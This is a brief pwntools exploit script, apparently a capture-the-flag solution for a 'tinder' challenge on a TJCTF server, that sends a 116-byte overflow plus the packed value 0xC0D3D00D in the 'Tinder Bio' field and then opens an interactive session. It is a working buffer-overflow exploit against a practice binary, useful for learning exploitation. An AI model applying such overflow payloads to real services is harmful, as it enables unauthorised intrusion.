from pwn import *

context(log_level='debug')

#p = process('./tinder')
p = remote('p1.tjctf.org', 8002)

#gdb.attach(p, "b *0x80488e4")

payload = 'a'*116
payload += p32(0xC0D3D00D)

p.recvuntil('Name: ')
p.sendline('aaaa')
p.recvuntil('Username: ')
p.sendline('bbbb')
p.recvuntil('Password: ')
p.sendline('cccc')
p.recvuntil('Tinder Bio: ')
p.sendline(payload)

p.interactive()



